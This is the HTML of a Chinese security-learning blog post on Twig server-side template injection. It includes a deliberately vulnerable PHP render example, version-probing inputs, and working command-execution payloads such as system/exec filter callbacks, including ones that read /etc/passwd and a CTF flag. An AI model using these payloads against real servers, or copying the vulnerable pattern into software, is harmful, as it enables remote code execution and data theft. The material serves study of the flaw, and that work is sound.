@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="SoloWalker">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/04/11/twig模板下的ssti/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI之twig">
+<meta property="og:url" content="http://example.com/2026/04/11/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84SSTI/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-04-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-13T12:33:41.492Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="漏洞学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SSTI之twig | SoloWalker
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"SoloWalker","subtitle":{"text":["WebSecurity Learner"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-solid fa-tags"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                SoloWalker
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">SSTI之twig</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">SoloWalker</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-11</span>
+        <span class="mobile">2026-04-11</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-13 20:33:41</span>
+            <span class="mobile">2026-04-13 20:33:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">漏洞学习笔记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="Twig与SSTI"><a href="#Twig与SSTI" class="headerlink" title="Twig与SSTI"></a>Twig与SSTI</h1><h2 id="twig简介"><a href="#twig简介" class="headerlink" title="twig简介"></a>twig简介</h2><p>twig是一个PHP的现代模板引擎，广泛用于Symfony框架。</p>
+<h3 id="twig的三种基础语法结构"><a href="#twig的三种基础语法结构" class="headerlink" title="twig的三种基础语法结构"></a>twig的三种基础语法结构</h3><ul>
+<li><code>&#123;&#123;...&#125;&#125;</code>：用于输出变量或表达式的值。</li>
+</ul>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">hello,</span><span class="template-variable">&#123;&#123;user.name&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>&#123;%...%&#125;</code>：用于执行逻辑控制，如 if 判断，for 循环</li>
+</ul>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# 判断是否显示 #&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">if</span> user.is_admin <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/admin&quot;</span>&gt;</span>管理后台<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>&#123;&#123;#...#&#125;&#125;</code>：用于写注释，在最终的HTML源码中是看不到的</li>
+</ul>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#123;# 这是给程序员看的备注，用户看不见 #&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>twig也有沙箱模式，默认禁用危险函数（如system），但需要手动启用完整沙箱限制。</p>
+<h2 id="开发中的代码样例"><a href="#开发中的代码样例" class="headerlink" title="开发中的代码样例"></a>开发中的代码样例</h2><h3 id="安全的样例"><a href="#安全的样例" class="headerlink" title="安全的样例"></a>安全的样例</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP控制器逻辑（安全用法）</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>([</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;Hello, &#123;&#123; name &#125;&#125;!&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 输入过滤</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="variable">$name</span>]);</span><br></pre></td></tr></table></figure></div>
+
+<p>为什么这样是安全的？</p>
+<p><code>$twig-&gt;render(&#39;index&#39;, [&#39;name&#39; =&gt; $name])</code>在这段代码中，<code>&#39;index&#39;</code>让twig去加载预先写好的模板文件，这个文件内容是服务器上硬编码的，用户无法修改。</p>
+<p><code>[&#39;name&#39; =&gt; $name]</code>这里则是告诉twig把这个变量的值直接填充到模板里的<code>&#123;&#123;name&#125;&#125;</code>。</p>
+<h3 id="不安全的样例"><a href="#不安全的样例" class="headerlink" title="不安全的样例"></a>不安全的样例</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP控制器逻辑（危险操作！）</span></span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]; <span class="comment">// 未过滤直接传入模板</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="variable">$user_input</span>, []); <span class="comment">// 直接渲染用户输入</span></span><br></pre></td></tr></table></figure></div>
+
+<p>为什么这样不安全？</p>
+<p>在twig的设计中，<code>render()</code>方法的签名一般是：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">render</span>(<span class="keyword">string</span> <span class="variable">$template_name</span>, <span class="keyword">array</span> <span class="variable">$context</span> = [])</span><br></pre></td></tr></table></figure></div>
+
+<p>第一个参数表示模板文件路径或模板标识符，第二个参数是填充进模板的数据。</p>
+<p>这样就会直接直接渲染用户输入。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>在找到注入点之后，我们要先判断当前是否是沙箱模式：</p>
+<div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">constant</span>(<span class="string">&#x27;PHP_VERSION&#x27;</span>)&#125;&#125;</span><span class="language-xml">      //判断PHP版本</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.version&#125;&#125;</span><span class="language-xml">            //判断twig版本</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在twig模板引擎中，<code>_self</code>是一个全局变量，在 twig 1.x 版本中，<code>_self</code>代表当前模板的实例，通过它可以访问到模板对象的属性和方法，例如<code>_self.env</code>可以获取到 twig 的核心环境对象，即<code>Twig_Environment</code>。</p>
+<p>如果<code>&#123;&#123;_self.env&#125;&#125;</code>返回<code>null</code>或者报错，则沙箱已启用。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="非沙箱模式利用"><a href="#非沙箱模式利用" class="headerlink" title="非沙箱模式利用"></a>非沙箱模式利用</h3><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml">       <span class="comment">&lt;!-- 执行系统命令 --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这段代码能生效的前提是：攻击者必须先通过漏洞将PHP的<code>system</code>函数注册为 twig 的动态过滤器回调，一般利用<code>registerUndefinedFilterCallback</code>来完成。</p>
+<h5 id="什么是过滤器"><a href="#什么是过滤器" class="headerlink" title="什么是过滤器"></a>什么是过滤器</h5><p>在 twig 模板引擎中，过滤器是用于处理数据输出格式的核心工具。原始数据经过管道符<code>|</code>左侧流入，在右侧过滤器中进行格式化处理之后，最终显示在页面上。</p>
+<h5 id="CTF中的payload样例"><a href="#CTF中的payload样例" class="headerlink" title="CTF中的payload样例"></a>CTF中的payload样例</h5><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里逐步拆解这个payload的执行逻辑。</p>
+<h6 id="劫持过滤器系统"><a href="#劫持过滤器系统" class="headerlink" title="劫持过滤器系统"></a>劫持过滤器系统</h6><div class="code-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>_self.env</code>:通过 twig 内部变量获取到核心环境对象。</li>
+<li><code>registerUndefinedFilterCallback</code>：这是环境对象的一个方法。设计初衷是：当模板中调用了一个不存在的过滤器时，twig 会访问这个方法来确认该怎么处理。</li>
+<li><code>&quot;exec&quot;</code>：把PHP的系统命令执行函数的名字作为参数传入</li>
+</ul>
+<p>这里解释一下为什么会导致 exec 这个字符串传入后会导致命令执行。</p>
+<p>下面是 twig 源码的简化版：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ... 查找过滤器 ...</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filters[<span class="variable">$name</span>])) &#123;</span><br><span class="line">        <span class="comment">// 如果找不到，且注册了回调，就触发回调</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;undefinedFilterCallback) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;undefinedFilterCallback, <span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在这里面我们可以看到，twig 使用了<code>call_user_func</code>这个函数来实现动态过滤器回调的注册，一旦我们能控制<code>undefinedFilterCallback</code>这个属性，就有可能实现RCE。</p>
+<p>所以如果我们将<code>exec</code>这个字符串传入<code>registerUndefinedFilterCallback</code>方法，就会导致调用一切不存在的过滤器时，都会进入<code>call_user_func</code>函数中，与前面的<code>$this-&gt;undefinedFilterCallback</code>属性结合，进行动态函数调用。</p>
